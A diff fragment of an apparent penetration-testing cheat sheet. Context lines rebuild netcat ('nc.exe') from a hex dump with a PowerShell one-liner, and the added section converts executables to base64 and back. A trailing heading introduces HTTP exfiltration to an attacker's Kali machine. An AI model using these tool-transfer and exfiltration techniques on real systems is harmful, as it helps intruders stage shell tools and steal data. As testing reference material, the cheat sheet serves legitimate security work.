@@ -211,6 +211,16 @@ echo|set /p="4d5a90000300000004000000ffff0000b8000000000000004000000000000000000
 powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
 ```
 
+## binary to b64 and back (you can use `upx` to shrink the exe first)
+### exe -> b64
+```powershell
+[Convert]::ToBase64String([IO.File]::ReadAllBytes('c:\windows\system32\whoami.exe')) > whoami.txt
+```
+### b64 -> exe 
+```powershell
+[System.IO.File]::WriteAllBytes("c:\users\user\desktop\whoami2.exe", [System.Convert]::FromBase64String( (cat whoami.txt) ))
+```
+
 ## Exfiltration with HTTP using powershell
 *if outbound HTTP traffic is allowed,*  
 we can use the `System.Net.WebClient` **PowerShell** class to upload data to our Kali machine through an HTTP POST request.
